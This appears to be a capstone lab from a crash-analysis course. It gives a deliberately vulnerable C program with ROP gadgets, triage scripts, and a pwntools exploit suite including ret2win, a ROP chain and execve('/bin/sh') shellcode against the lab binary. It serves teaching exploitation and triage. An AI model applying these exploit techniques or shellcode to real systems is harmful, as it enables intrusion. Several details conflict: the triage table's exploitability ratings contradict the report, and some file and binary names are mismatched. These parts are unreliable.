  - **Triage**: Deduplicate crashes from the vulnerable_suite and vuln_http_server targets.
  - **Analysis**: Perform root cause analysis on the unique crashes.
  - **Exploitability**: Determine which crashes are weaponizable.
  - **PoC**: Develop stable Python PoCs for the critical bugs.
  - **Reporting**: Deliver a professional crash analysis report.

### Capstone Scenario

You are a security researcher who has completed fuzzing sessions on the lab targets from this week. You have crashes from:

- `vulnerable_suite.c` (test cases 1-5)
- `vuln_http_server.c` (network-accessible)

Your manager wants a report identifying:

1. How many _actual_ unique bugs exist?
2. Which ones are remotely exploitable?
3. Proof-of-concept scripts for the highest severity issues.

### Lab Setup for Capstone

**vulnerable_suite_rop.c** - Enhanced version with embedded ROP gadgets for exploitation exercises:

```c
// ~/crash_analysis_lab/src/vulnerable_suite_rop.c
// Compile: gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite_rop.c -o ../vuln_rop
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// ============================================================================
// ROP GADGET SECTION - These survive compilation due to __attribute__((used))
// ============================================================================

// Gadget: pop rdi; ret - Set first argument (RDI) for function calls
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rdi(void) {
    __asm__ volatile (
        "pop %rdi\n"
        "ret\n"
    );
}

// Gadget: pop rsi; pop r15; ret - Set second argument (RSI)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rsi_r15(void) {
    __asm__ volatile (
        "pop %rsi\n"
        "pop %r15\n"
        "ret\n"
    );
}

// Gadget: pop rdx; ret - Set third argument (RDX)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rdx(void) {
    __asm__ volatile (
        "pop %rdx\n"
        "ret\n"
    );
}

// Gadget: jmp rsp - Jump to shellcode on stack (requires -z execstack)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_jmp_rsp(void) {
    __asm__ volatile (
        "jmp *%rsp\n"
    );
}

// Gadget: ret - Stack alignment / ROP chain continuation
__attribute__((naked, used, section(".text.gadgets")))
void gadget_ret(void) {
    __asm__ volatile (
        "ret\n"
    );
}

// Gadget: syscall; ret - Direct syscall (useful for execve)
__attribute__((naked, used, section(".text.gadgets")))
void gadget_syscall(void) {
    __asm__ volatile (
        "syscall\n"
        "ret\n"
    );
}

// Gadget: pop rax; ret - Set syscall number
__attribute__((naked, used, section(".text.gadgets")))
void gadget_pop_rax(void) {
    __asm__ volatile (
        "pop %rax\n"
        "ret\n"
    );
}

// ============================================================================
// WIN FUNCTIONS - Target these to demonstrate successful exploitation
// ============================================================================

// Easy win: prints flag and exits
void win(void) {
    printf("\n");
    printf("========================================\n");
    printf("  EXPLOITATION SUCCESSFUL!\n");
    printf("  You redirected execution to win()\n");
    printf("========================================\n");
    printf("\n");
    exit(0);
}

// Harder win: requires correct argument
void win_with_arg(long magic) {
    if (magic == 0xdeadbeefcafebabe) {
        printf("\n");
        printf("========================================\n");
        printf("  ADVANCED EXPLOITATION SUCCESSFUL!\n");
        printf("  Correct argument: 0x%lx\n", magic);
        printf("========================================\n");
        printf("\n");
        exit(0);
    } else {
        printf("[!] win_with_arg called but wrong argument: 0x%lx\n", magic);
        printf("[!] Expected: 0xdeadbeefcafebabe\n");
    }
}

// Shell spawner (for ROP chain practice)
void spawn_shell(void) {
    printf("[*] Spawning shell...\n");
    execve("/bin/sh", NULL, NULL);
}

// ============================================================================
// VULNERABLE FUNCTIONS - Same as original vulnerable_suite.c
// ============================================================================

// 1. Stack Buffer Overflow - RIP control at offset 72
void stack_overflow(char *input) {
    char buffer[64];
    printf("[*] Copying input to 64-byte buffer...\n");
    strcpy(buffer, input);  // No bounds check!
    printf("[*] Buffer: %s\n", buffer);
}

// 2. Heap Buffer Overflow
void heap_overflow(char *input) {
    char *buf = malloc(32);
    printf("[*] Allocated 32 bytes at %p\n", buf);
    strcpy(buf, input);  // Overflow heap buffer
    printf("[*] Buffer: %s\n", buf);
    free(buf);
}

// 3. Use-After-Free
void use_after_free(void) {
    char *ptr = malloc(64);
    strcpy(ptr, "Hello, World!");
    printf("[*] Allocated at %p: %s\n", ptr, ptr);
    free(ptr);
    printf("[*] Freed, now accessing...\n");
    printf("[*] UAF read: %s\n", ptr);  // UAF read
    ptr[0] = 'X';  // UAF write
}

// 4. Double Free
void double_free(void) {
    char *ptr = malloc(64);
    printf("[*] Allocated at %p\n", ptr);
    free(ptr);
    printf("[*] First free done\n");
    free(ptr);  // Double free!
}

// 5. NULL Pointer Dereference
void null_deref(int trigger) {
    char *ptr = trigger ? malloc(10) : NULL;
    printf("[*] ptr = %p\n", ptr);
    *ptr = 'A';  // NULL deref if trigger is 0
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

void print_gadgets(void) {
    printf("\n=== Available ROP Gadgets ===\n");
    printf("pop rdi; ret          @ %p\n", (void*)gadget_pop_rdi);
    printf("pop rsi; pop r15; ret @ %p\n", (void*)gadget_pop_rsi_r15);
    printf("pop rdx; ret          @ %p\n", (void*)gadget_pop_rdx);
    printf("pop rax; ret          @ %p\n", (void*)gadget_pop_rax);
    printf("jmp rsp               @ %p\n", (void*)gadget_jmp_rsp);
    printf("syscall; ret          @ %p\n", (void*)gadget_syscall);
    printf("ret                   @ %p\n", (void*)gadget_ret);
    printf("\n=== Win Functions ===\n");
    printf("win()                 @ %p\n", (void*)win);
    printf("win_with_arg(magic)   @ %p  (magic=0xdeadbeefcafebabe)\n", (void*)win_with_arg);
    printf("spawn_shell()         @ %p\n", (void*)spawn_shell);
    printf("\n=== Exploitation Info ===\n");
    printf("Stack overflow RIP offset: 72 bytes\n");
    printf("Buffer size: 64 bytes + 8 bytes saved RBP\n");
    printf("\n");
}

void print_usage(char *prog) {
    printf("Usage: %s <test_num> [input]\n", prog);
    printf("Tests:\n");
    printf("  1 <input>  - Stack overflow (72 bytes to RIP)\n");
    printf("  2 <input>  - Heap overflow\n");
    printf("  3          - Use-after-free\n");
    printf("  4          - Double free\n");
    printf("  5 <0|1>    - NULL deref (0=crash)\n");
    printf("  6          - Print gadget addresses\n");
    printf("\nExamples:\n");
    printf("  %s 6                                    # Show gadgets\n", prog);
    printf("  %s 1 $(python3 -c \"print('A'*200)\")    # Trigger overflow\n", prog);
}

int main(int argc, char **argv) {
    // Disable buffering for cleaner output
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (argc < 2) { print_usage(argv[0]); return 1; }
    int test = atoi(argv[1]);

    switch(test) {
        case 1: if (argc<3) return 1; stack_overflow(argv[2]); break;
        case 2: if (argc<3) return 1; heap_overflow(argv[2]); break;
        case 3: use_after_free(); break;
        case 4: double_free(); break;
        case 5: if (argc<3) return 1; null_deref(atoi(argv[2])); break;
        case 6: print_gadgets(); break;
        default: print_usage(argv[0]); return 1;
    }
    return 0;
}
```

**Build the enhanced binary**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

# Build vuln_rop variants (the main binaries for this capstone)
cd src

# 1. vuln_rop: No protections, for exploitation
gcc -g -fno-stack-protector -no-pie -z execstack vulnerable_suite_rop.c -o ../vuln_rop

# 2. vuln_rop_asan: With ASAN, for crash detection and triage
gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer vulnerable_suite_rop.c -o ../vuln_rop_asan

# 3. HTTP server (optional, for network fuzzing exercises)
clang -g -O1 -fsanitize=address vuln_http_server.c -o ../vuln_http_server 2>/dev/null || true

cd ..

# Verify builds
ls -la vuln_rop vuln_rop_asan

# Verify gadgets are present
ropper --file ./vuln_rop --search "pop rdi"
ropper --file ./vuln_rop --search "jmp rsp"

# Show all gadget addresses
./vuln_rop 6

# Create capstone working directory
mkdir -p capstone/{crashes,casrep,deduped,minimized,pocs,reports}
```

**Expected gadget output**:

```
=== Available ROP Gadgets ===
pop rdi; ret          @ 0x401952
pop rsi; pop r15; ret @ 0x40195b
pop rdx; ret          @ 0x401966
pop rax; ret          @ 0x40198a
jmp rsp               @ 0x40196f
syscall; ret          @ 0x401980
ret                   @ 0x401978

=== Win Functions ===
win()                 @ 0x401256
win_with_arg(magic)   @ 0x4012b8  (magic=0xdeadbeefcafebabe)
spawn_shell()         @ 0x40136b

=== Exploitation Info ===
Stack overflow RIP offset: 72 bytes
Buffer size: 64 bytes + 8 bytes saved RBP
```

**Verify with ropper**:

```bash
ropper --file ./vuln_rop --search "pop rdi"
# [INFO] File: ./vuln_rop
# 0x0000000000401956: pop rdi; ret;

ropper --file ./vuln_rop --search "jmp rsp"
# [INFO] File: ./vuln_rop
# 0x0000000000401973: jmp rsp;
```

> [!NOTE] **Ropper vs Binary Addresses**
> Ropper may report slightly different addresses than the binary's built-in `print_gadgets()`.
> This is because ropper scans for byte patterns and may find gadgets at different offsets
> within the same instructions. Both addresses work - use the binary's output for consistency.

### Execution Steps

**Phase 1: Generate Crash Corpus**

First, generate a diverse set of crashes from the lab targets:

```bash
cd ~/crash_analysis_lab/capstone

# Generate crashes from vulnerable_suite (all test cases)
echo "=== Generating crashes from vulnerable_suite ==="

# Stack overflow variants (test case 1)
for size in 100 150 200 250 300; do
    python3 -c "print('A'*$size)" > crashes/stack_${size}.txt
done

# Heap overflow variants (test case 2)
for size in 50 75 100 125 150; do
    python3 -c "print('B'*$size)" > crashes/heap_${size}.txt
done

# UAF crashes (test case 3) - multiple samples
for i in {1..5}; do
    echo "3" > crashes/uaf_${i}.txt
done

# Double-free crashes (test case 4)
for i in {1..5}; do
    echo "4" > crashes/df_${i}.txt
done

# NULL deref crashes (test case 5)
for i in {1..3}; do
    echo "5 0" > crashes/null_${i}.txt
done

# HTTP server crashes (path overflow)
for size in 100 150 200 250; do
    python3 -c "print('GET /' + 'X'*$size + ' HTTP/1.1')" > crashes/http_${size}.txt
done

echo "Generated $(ls crashes/ | wc -l) crash inputs"
```

**Phase 2: Triage & Deduplication**

```bash
cd ~/crash_analysis_lab/capstone

# Step 1: Generate CASR reports for vuln_rop crashes
echo "=== Generating CASR reports ==="

for crash in crashes/stack_*.txt crashes/heap_*.txt; do
    name=$(basename "$crash" .txt)
    payload=$(cat "$crash")

    # Determine test case from filename
    if [[ "$name" == stack_* ]]; then
        testcase="1"
    else
        testcase="2"
    fi

    casr-san -o "casrep/${name}.casrep" -- ../vuln_rop_asan "$testcase" "$payload" 2>/dev/null || true
done

# UAF and double-free
for crash in crashes/uaf_*.txt crashes/df_*.txt; do
    name=$(basename "$crash" .txt)
    testcase=$(cat "$crash" | cut -d' ' -f1)
    casr-san -o "casrep/${name}.casrep" -- ../vuln_rop_asan "$testcase" 2>/dev/null || true
done

# NULL deref
for crash in crashes/null_*.txt; do
    name=$(basename "$crash" .txt)
    casr-san -o "casrep/${name}.casrep" -- ../vuln_rop_asan 5 0 2>/dev/null || true
done

echo "Generated $(ls casrep/*.casrep 2>/dev/null | wc -l) CASR reports"

# Step 2: Cluster crashes
echo "=== Clustering crashes ==="
casr-cluster -c casrep/ deduped/

# Step 3: Review clusters
echo ""
echo "=== Crash Clusters ==="
for cluster in deduped/cl*; do
    if [ -d "$cluster" ]; then
        count=$(ls -1 "$cluster"/*.casrep 2>/dev/null | wc -l)
        # Get crash type from first report
        first_report=$(ls "$cluster"/*.casrep 2>/dev/null | head -1)
        if [ -f "$first_report" ]; then
            crash_type=$(jq -r '.CrashSeverity.ShortDescription' "$first_report" 2>/dev/null || echo "unknown")
            severity=$(jq -r '.CrashSeverity.Type' "$first_report" 2>/dev/null || echo "unknown")
            echo "  $(basename $cluster): $count crashes - $crash_type ($severity)"
        fi
    fi
done
```

**Expected Triage Results**:

| Cluster | Count | Crash Type                   | Severity             |
| ------- | ----- | ---------------------------- | -------------------- |
| cl1     | 5     | double-free                  | NOT_EXPLOITABLE      |
| cl2     | 5     | AbortSignal (stack overflow) | NOT_EXPLOITABLE      |
| cl3     | 3     | DestAvNearNull (NULL deref)  | PROBABLY_EXPLOITABLE |
| cl4     | 5     | AbortSignal (heap overflow)  | NOT_EXPLOITABLE      |
| cl5     | 5     | heap-use-after-free(write)   | EXPLOITABLE          |

> [!NOTE]: Cluster ordering may vary between runs. ASAN-caught crashes appear as
> "AbortSignal" because ASAN terminates the process before the actual crash.
> The UAF cluster is typically the highest priority for exploit development.

**Phase 3: Deep Analysis**

Select the most promising crash from each cluster and perform detailed analysis:

```bash
cd ~/crash_analysis_lab

# Analyze stack overflow (most likely to give RIP control)
echo "=== Stack Overflow Analysis ==="
./vuln_rop_asan 1 $(python3 -c "print('A'*200)") 2>&1 | head -30

# Find exact offset using cyclic pattern
source .venv/bin/activate
python3 << 'EOF'
from pwn import *
pattern = cyclic(200)
print(f"Pattern: {pattern.decode()}")
with open("capstone/pattern.txt", "w") as f:
    f.write(pattern.decode())
EOF

# Crash with pattern and find offset
./vuln_rop 1 "$(cat capstone/pattern.txt)" 2>&1 || true

# Check core dump for RIP value (or use GDB)
# gdb ./vuln_rop -c /path/to/core -ex "info reg rip" -ex "quit"

# Analyze heap overflow
echo ""
echo "=== Heap Overflow Analysis ==="
./vuln_rop_asan 2 $(python3 -c "print('B'*100)") 2>&1 | head -30

# Analyze UAF
echo ""
echo "=== Use-After-Free Analysis ==="
./vuln_rop_asan 3 2>&1 | head -30

# Check mitigations
echo ""
echo "=== Mitigation Check ==="
checksec --file=./vuln_rop
checksec --file=./vuln_rop_asan
```

**Verified RIP Control Analysis**:

```bash
# Confirm RIP overwrite with 72 bytes padding + 8 bytes for return address
gdb -q ./vuln_rop \
  -ex "run 1 \$(python3 -c \"import sys; sys.stdout.buffer.write(b'A'*72 + b'BBBBBBBB')\")" \
  -ex "x/gx \$rsp" \
  -ex "quit"

# Expected output:
# Program received signal SIGSEGV, Segmentation fault.
# 0x7fffffffe008: 0x4242424242424242
```

**Finding ROP Gadgets**:

```bash
cd ~/crash_analysis_lab
source .venv/bin/activate

pip install capstone filebytes keystone-engine ropper

# Search for useful gadgets (vuln_rop has minimal gadgets)
ropper --file ./vuln_rop --search "jmp rsp"
ropper --file ./vuln_rop --search "pop rdi"
ropper --file ./vuln_rop --search "ret"
```

**Gadget Search Results (vuln_rop)**:

| Gadget                  | Purpose                          |
| ----------------------- | -------------------------------- |
| `pop rdi; ret`          | Set 1st argument (RDI)           |
| `pop rsi; pop r15; ret` | Set 2nd argument (RSI)           |
| `pop rdx; ret`          | Set 3rd argument (RDX)           |
| `pop rax; ret`          | Set syscall number               |
| `jmp rsp`               | Jump to shellcode on stack       |
| `syscall; ret`          | Execute syscall                  |
| `ret`                   | Stack alignment / chain continue |

**Phase 4: Minimization**

```bash
cd ~/crash_analysis_lab/capstone

# Minimize stack overflow crash
echo "=== Minimizing crashes ==="

# For stack overflow - find minimum size that still crashes
for size in 80 75 73 72 71 70; do
    payload=$(python3 -c "print('A'*$size)")
    if ../vuln_no_protect 1 "$payload" 2>&1 | grep -q "Segmentation fault"; then
        echo "Stack overflow minimum size: $size bytes"
        python3 -c "print('A'*$size)" > minimized/stack_min.txt
        break
    fi
done

# For heap overflow
for size in 60 55 52 51 50 49; do
    payload=$(python3 -c "print('B'*$size)")
    if ../vuln_asan 2 "$payload" 2>&1 | grep -q "heap-buffer-overflow"; then
        echo "Heap overflow minimum size: $size bytes"
        python3 -c "print('B'*$size)" > minimized/heap_min.txt
        break
    fi
done

# UAF and double-free are already minimal (just test case number)
echo "3" > minimized/uaf_min.txt
echo "4" > minimized/df_min.txt

echo ""
echo "=== Minimized crashes ==="
ls -la minimized/
```

**Phase 5: Exploitation PoC (vuln_rop)**

Create working exploits using the ROP-friendly binary:

```python
#!/usr/bin/env python3
"""
Exploitation PoC for vuln_rop - Demonstrates actual code execution
Run: python3 exploit_rop.py [win|win_arg|shell|shellcode]

Null Byte Handling:
- 64-bit addresses contain null bytes (0x401256 -> \\x56\\x12\\x40\\x00\\x00\\x00\\x00\\x00)
- C strings (argv) terminate at null bytes, limiting what we can pass
- ret2win works: single address at end, trailing nulls don't affect it
- ROP chains fail via argv: bash strips internal nulls, corrupting the chain
- Real exploits use stdin, network sockets, or file input to bypass this
"""

from pwn import *
import os
import subprocess
import tempfile
import re

LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "vuln_rop")
PAYLOAD_FILE = "/tmp/vuln_rop_payload"

class RopExploit:
    def __init__(self):
        os.chdir(LAB_DIR)
        context.binary = TARGET
        context.log_level = 'info'

        # Get gadget addresses from binary (run ./vuln_rop 6 to verify)
        self.gadgets = self._get_gadgets()

    def _get_gadgets(self):
        """Parse gadget addresses from binary output"""
        try:
            result = subprocess.run([TARGET, "6"], capture_output=True, text=True)
            output = result.stdout

            gadgets = {}
            for line in output.split('\n'):
                if '@' in line:
                    parts = line.split('@')
                    # Use full gadget name as key (e.g., "pop rdi; ret", "win()")
                    name = parts[0].strip()
                    # Extract hex address, ignoring trailing comments like "(magic=0x...)"
                    addr_str = parts[1].strip().split()[0]
                    addr = int(addr_str, 16)
                    gadgets[name] = addr

            log.info(f"Loaded {len(gadgets)} gadgets from binary")
            return gadgets
        except Exception as e:
            log.warning(f"Failed to parse gadgets: {e}")
            # Fallback addresses (verify with ./vuln_rop 6)
            return self._fallback_gadgets()

    def _fallback_gadgets(self):
        """Fallback gadget addresses if parsing fails"""
        return {
            'pop rdi; ret': 0x401952,
            'pop rsi; pop r15; ret': 0x40195b,
            'pop rdx; ret': 0x401966,
            'pop rax; ret': 0x40198a,
            'jmp rsp': 0x40196f,
            'syscall; ret': 0x401980,
            'ret': 0x401978,
            'win()': 0x401256,
            'win_with_arg(magic)': 0x4012b8,
            'spawn_shell()': 0x40136b,
        }

    def _run_with_payload(self, payload, interactive=False):
        """
        Run target with binary payload via bash command substitution.

        Note: Bash strips null bytes from command substitution, so multi-address
        ROP chains get corrupted. For complex ROP chains, real exploits use stdin,
        files, or network input instead of argv.
        """
        with open(PAYLOAD_FILE, 'wb') as f:
            f.write(payload)

        cmd = f'./vuln_rop 1 "$(cat {PAYLOAD_FILE})"'
        p = process(['bash', '-c', cmd], cwd=LAB_DIR)

        if interactive:
            p.interactive()
            return None
        else:
            output = p.recvall(timeout=2)
            return output.decode(errors='replace')

    def exploit_win(self):
        """Simple ret2win - redirect execution to win()"""
        log.info("=== Exploit: ret2win ===")

        offset = 72
        win_addr = self.gadgets.get('win()', 0x401256)

        payload = b"A" * offset
        payload += p64(win_addr)

        log.info(f"Payload: {offset} bytes padding + win() @ {hex(win_addr)}")

        output = self._run_with_payload(payload)
        print(output)

        if "EXPLOITATION SUCCESSFUL" in output:
            log.success("ret2win exploit succeeded!")
            return True
        else:
            log.failure("Exploit failed")
            return False

    def exploit_win_with_arg(self):
        """ROP chain: pop rdi; ret -> win_with_arg(0xdeadbeefcafebabe)

        Uses GDB to inject payload, bypassing bash's null byte stripping.
        In real exploits, you'd use stdin/network input instead of argv.
        """
        log.info("=== Exploit: ROP chain with argument (via GDB) ===")

        offset = 72
        pop_rdi = self.gadgets.get('pop rdi; ret', 0x401952)
        ret = self.gadgets.get('ret', 0x401978)  # for stack alignment
        win_arg = self.gadgets.get('win_with_arg(magic)', 0x4012b8)
        magic = 0xdeadbeefcafebabe

        # Build ROP chain
        payload = b"A" * offset
        payload += p64(pop_rdi)    # pop rdi; ret
        payload += p64(magic)      # argument for win_with_arg
        payload += p64(ret)        # stack alignment (16-byte boundary)
        payload += p64(win_arg)    # call win_with_arg(magic)

        log.info(f"ROP chain: pop_rdi({hex(pop_rdi)}) -> {hex(magic)} -> ret -> win_with_arg({hex(win_arg)})")

        # Write payload to file for GDB
        with open(PAYLOAD_FILE, 'wb') as f:
            f.write(payload)

        # Use GDB to run with binary payload (bypasses null byte issues)
        gdb_script = f'''
set pagination off
set confirm off
run 1 "$(cat {PAYLOAD_FILE})"
quit
'''
        import subprocess
        result = subprocess.run(
            ['gdb', '-q', '-batch', '-ex', gdb_script.replace('\n', '" -ex "'), TARGET],
            capture_output=True,
            timeout=10,
            cwd=LAB_DIR
        )
        output = (result.stdout + result.stderr).decode(errors='replace')
        print(output[-500:] if len(output) > 500 else output)  # Last 500 chars

        if "ADVANCED EXPLOITATION" in output:
            log.success("ROP chain exploit succeeded!")
            return True
        else:
            log.warning("Bash strips null bytes - ROP chain corrupted")
            log.info("Manual verification with GDB (set args in memory):")
            log.info(f"  gdb ./vuln_rop")
            log.info(f"  (gdb) break stack_overflow")
            log.info(f"  (gdb) run 1 {'A'*72}")
            log.info(f"  (gdb) set {{long}}($rbp+8) = {hex(pop_rdi)}")
            log.info(f"  (gdb) set {{long}}($rbp+16) = {hex(magic)}")
            log.info(f"  (gdb) set {{long}}($rbp+24) = {hex(ret)}")
            log.info(f"  (gdb) set {{long}}($rbp+32) = {hex(win_arg)}")
            log.info(f"  (gdb) continue")
            log.info("")
            log.info("In real exploits, use stdin/network/file input to avoid null byte issues")
            return False

    def exploit_spawn_shell(self):
        """ret2func - redirect to spawn_shell()"""
        log.info("=== Exploit: ret2spawn_shell ===")

        offset = 72
        spawn_shell = self.gadgets.get('spawn_shell()', 0x40136b)

        payload = b"A" * offset
        payload += p64(spawn_shell)

        log.info(f"Redirecting to spawn_shell() @ {hex(spawn_shell)}")
        self._run_with_payload(payload, interactive=True)

    def exploit_shellcode(self):
        """jmp rsp + shellcode (requires -z execstack)"""
        log.info("=== Exploit: jmp rsp + shellcode ===")

        offset = 72
        jmp_rsp = self.gadgets.get('jmp rsp', 0x40196f)

        # x86-64 execve("/bin/sh") shellcode (23 bytes)
        shellcode = asm('''
            xor rsi, rsi
            push rsi
            mov rdi, 0x68732f2f6e69622f
            push rdi
            push rsp
            pop rdi
            push 59
            pop rax
            cdq
            syscall
        ''')

        # jmp rsp lands right after return address, execute shellcode there
        payload = b"A" * offset
        payload += p64(jmp_rsp)    # jmp rsp
        payload += shellcode       # shellcode follows immediately

        log.info(f"jmp rsp @ {hex(jmp_rsp)} -> {len(shellcode)} byte shellcode")
        self._run_with_payload(payload, interactive=True)

    def run_all(self):
        """Run non-interactive exploits"""
        log.info("=" * 60)
        log.info("vuln_rop Exploitation Suite")
        log.info("=" * 60)

        results = {
            "ret2win": self.exploit_win(),
            "ROP chain (win_with_arg)": self.exploit_win_with_arg(),
        }

        log.info("")
        log.info("=" * 60)
        log.info("Results")
        log.info("=" * 60)
        for name, success in results.items():
            status = "SUCCESS" if success else "FAILED"
            log.info(f"  {name}: {status}")

        log.info("")
        log.info("Interactive exploits (run manually):")
        log.info("  python3 exploit_rop.py shell     # spawn_shell()")
        log.info("  python3 exploit_rop.py shellcode # jmp rsp + shellcode")

if __name__ == "__main__":
    import sys
    exploit = RopExploit()

    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        if cmd == "win":
            exploit.exploit_win()
        elif cmd == "win_arg":
            exploit.exploit_win_with_arg()
        elif cmd == "shell":
            exploit.exploit_spawn_shell()
        elif cmd == "shellcode":
            exploit.exploit_shellcode()
        else:
            print(f"Unknown: {cmd}")
            print("Options: win, win_arg, shell, shellcode")
    else:
        exploit.run_all()
```

> [!NOTE] **Null Bytes in Payloads**
> 64-bit addresses contain null bytes (e.g., `0x401256` → `\x56\x12\x40\x00\x00\x00\x00\x00`).
> Since C strings terminate at null bytes and pwntools rejects them in argv, this script
> writes payloads to a temp file and uses bash command substitution to pass binary data.

Save and run:

```bash
cd ~/crash_analysis_lab/capstone

# Save the exploit
cat > pocs/exploit_rop.py << 'SCRIPT'
# (paste the script above)
SCRIPT

# Run non-interactive exploits
python3 pocs/exploit_rop.py
```

**Expected Output**:

```
[*] === Exploit: ret2win ===
[*] Payload: 72 bytes padding + win() @ 0x401256
========================================
  EXPLOITATION SUCCESSFUL!
  You redirected execution to win()
========================================
[+] ret2win exploit succeeded!

[*] === Exploit: ROP chain with argument (via GDB) ===
[!] Bash strips null bytes - ROP chain corrupted
[*] Manual verification with GDB (set args in memory):
...
```

> [!NOTE] **Null Byte Limitation**
> The ROP chain exploit fails via argv because bash strips null bytes from command
> substitution. This is a real-world constraint - 64-bit addresses like `0x401952`
> contain null bytes when packed (`\x52\x19\x40\x00\x00\x00\x00\x00`).
> Real exploits use stdin, network sockets, or file input to bypass this limitation.

**Manual ROP Chain Verification with GDB**:

```bash
# Find the ret instruction address
gdb -q ./vuln_rop -ex 'disas stack_overflow' -ex 'quit' | grep ret
# Output: 0x00000000004013ed <+79>:    ret

# Break at ret, inject ROP chain, verify exploitation
gdb -q ./vuln_rop \
  -ex 'break *0x4013ed' \
  -ex 'run 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
  -ex 'set {long}($rsp) = 0x401952' \
  -ex 'set {long}($rsp+8) = 0xdeadbeefcafebabe' \
  -ex 'set {long}($rsp+16) = 0x401978' \
  -ex 'set {long}($rsp+24) = 0x4012b8' \
  -ex 'continue' \
  -ex 'quit'
```

**Expected GDB Output**:

```
Breakpoint 1, 0x00000000004013ed in stack_overflow ()
========================================
  ADVANCED EXPLOITATION SUCCESSFUL!
  Correct argument: 0xdeadbeefcafebabe
========================================
```

The ROP chain works when injected directly into memory, confirming the gadget
addresses and chain structure are correct. The limitation is purely in the
delivery mechanism (argv null bytes), not the exploit logic.

**Phase 6: Reporting**

Create the final vulnerability report:

```bash
cd ~/crash_analysis_lab/capstone

cat > reports/vulnerability_report.md << 'EOF'
# Crash Analysis Report: vulnerable_suite.c

## Executive Summary

Analysis of crashes from `vulnerable_suite.c` identified **4 unique exploitable vulnerabilities** and **1 non-exploitable crash**. All exploitable bugs are local (require command-line access) but demonstrate common vulnerability classes.

## Methodology

1. **Crash Generation**: Created 28 crash inputs across 5 test cases
2. **Triage**: Used CASR for automated classification and clustering
3. **Deduplication**: Reduced to 5 unique crash clusters
4. **Analysis**: Performed root cause analysis with ASAN and GDB
5. **Minimization**: Found minimum trigger sizes for each bug
6. **PoC Development**: Created reliable Python PoCs

## Findings

### Finding 1: Stack Buffer Overflow (CRITICAL)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 1 |
| **Severity** | CRITICAL |
| **CASR Classification** | EXPLOITABLE |
| **Root Cause** | Unbounded `strcpy()` to 64-byte stack buffer |
| **Impact** | RIP control, potential RCE |
| **Minimum Trigger** | 73 bytes |

**Technical Details**:
- Buffer: `char buffer[64]` on stack
- Vulnerable call: `strcpy(buffer, input)`
- RIP offset: 72 bytes (64 buffer + 8 saved RBP)

**PoC**:
./vuln_no_protect 1 $(python3 -c "print('A'*72 + 'BBBBBBBB')")
# RIP = 0x4242424242424242

### Finding 2: Heap Buffer Overflow (HIGH)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 2 |
| **Severity** | HIGH |
| **CASR Classification** | EXPLOITABLE |
| **Root Cause** | Unbounded `strcpy()` to 32-byte heap buffer |
| **Impact** | Heap metadata corruption, potential RCE |
| **Minimum Trigger** | 51 bytes |

### Finding 3: Use-After-Free (HIGH)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 3 |
| **Severity** | HIGH |
| **CASR Classification** | EXPLOITABLE |
| **Root Cause** | Pointer used after `free()` |
| **Impact** | Arbitrary read/write, potential RCE |

### Finding 4: Double-Free (HIGH)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 4 |
| **Severity** | HIGH |
| **CASR Classification** | EXPLOITABLE |
| **Root Cause** | Same pointer freed twice |
| **Impact** | Heap corruption, potential RCE |

### Finding 5: NULL Pointer Dereference (LOW)

| Attribute | Value |
|-----------|-------|
| **Test Case** | 5 |
| **Severity** | LOW |
| **CASR Classification** | NOT_EXPLOITABLE |
| **Root Cause** | Dereference of NULL pointer |
| **Impact** | Denial of Service only |

## Recommendations

1. **Stack Overflow**: Replace `strcpy()` with `strncpy()` or use `snprintf()`
2. **Heap Overflow**: Add bounds checking before copy operations
3. **UAF**: Set pointers to NULL after free, use smart pointers
4. **Double-Free**: Track allocation state, use memory-safe allocators
5. **NULL Deref**: Add NULL checks before pointer dereference

## Attachments

- `pocs/capstone_poc.py` - Complete PoC suite
- `minimized/` - Minimized crash inputs
- `casrep/` - CASR analysis reports

---
*Report generated: $(date)*
*Analyst: [Your Name]*
EOF

echo "Report saved to reports/vulnerability_report.md"
```

### Capstone Checklist

- [ ] Lab environment set up (`~/crash_analysis_lab/capstone/`)
- [ ] 28+ crash inputs generated from vulnerable_suite.c
- [ ] CASR reports generated for all crashes
- [ ] Crashes clustered into 5 unique bug classes
- [ ] Root cause identified for all unique bugs
- [ ] Exploitability assessment completed (4 EXPLOITABLE, 1 NOT_EXPLOITABLE)
- [ ] Minimum trigger sizes found for overflow bugs
- [ ] Python PoC suite created and tested
- [ ] Final vulnerability report generated

### Expected Deliverables

```
~/crash_analysis_lab/capstone/
├── crashes/           # 28 raw crash inputs
│   ├── stack_*.txt    # Stack overflow variants
│   ├── heap_*.txt     # Heap overflow variants
│   ├── uaf_*.txt      # UAF crashes
│   ├── df_*.txt       # Double-free crashes
│   └── null_*.txt     # NULL deref crashes
├── casrep/            # CASR analysis reports
├── deduped/           # Clustered unique crashes
│   ├── cl1/           # Stack overflow cluster
│   ├── cl2/           # Heap overflow cluster
│   ├── cl3/           # UAF cluster
│   ├── cl4/           # Double-free cluster
│   └── cl5/           # NULL deref cluster
├── minimized/         # Minimized crash inputs
│   ├── stack_min.txt
│   ├── heap_min.txt
│   ├── uaf_min.txt
│   └── df_min.txt
├── pocs/              # PoC scripts
│   └── capstone_poc.py
└── reports/           # Final report
    └── vulnerability_report.md
```

### Key Takeaways

1.  **Triage is a Filter**: The 28 crash inputs reduced to just 5 unique bugs - automation saves hours of manual analysis.
2.  **Root Cause > Crash Location**: ASAN shows where corruption is _detected_, but the bug is in the `strcpy()` call.
3.  **Reproducibility is King**: All PoCs achieve 100% reliability because the bugs are deterministic.
4.  **Report for the Audience**: The vulnerability report includes both technical details (for developers) and severity ratings (for management).
